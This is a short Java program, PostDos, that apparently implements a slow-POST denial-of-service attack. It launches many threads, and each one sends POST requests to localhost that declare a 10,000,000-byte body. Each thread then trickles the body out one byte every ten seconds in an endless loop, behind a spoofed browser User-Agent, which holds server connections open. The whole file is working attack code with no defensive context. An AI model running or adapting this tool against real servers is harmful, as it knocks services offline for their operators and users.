import java.net.*;
import java.io.*;

public class PostDos {

  public static void main(String[] args) throws MalformedURLException{
    for(int i = 0; i < Integer.parseInt(args[0]); i++){
      DoSThread dThread = new DoSThread(new URL("http://localhost"));
      dThread.start();
    }
  }

  public static class DoSThread extends Thread {

    private URL url;
    private final int contentLength = 10000000;

    public DoSThread(URL url){
      this.url = url;
    }

    public void run(){
      while(true){
        try {
          attack();
        } catch (Exception e) {
           e.printStackTrace();
        }
      }
    }

    public void attack() throws IOException, InterruptedException {
      HttpURLConnection connection = (HttpURLConnection) url.openConnection();
      connection.setDoOutput(true);
      connection.setRequestMethod("POST");
      connection.setRequestProperty("charset", "utf-8");
      connection.setRequestProperty("Host", "localhost");
      connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
      connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
      connection.setRequestProperty("Content-Length", String.valueOf(contentLength));
      for(int i = 0; i < contentLength; i++){
        connection.getOutputStream().write(i);
        Thread.sleep(10000);
      }
    }
  }
}

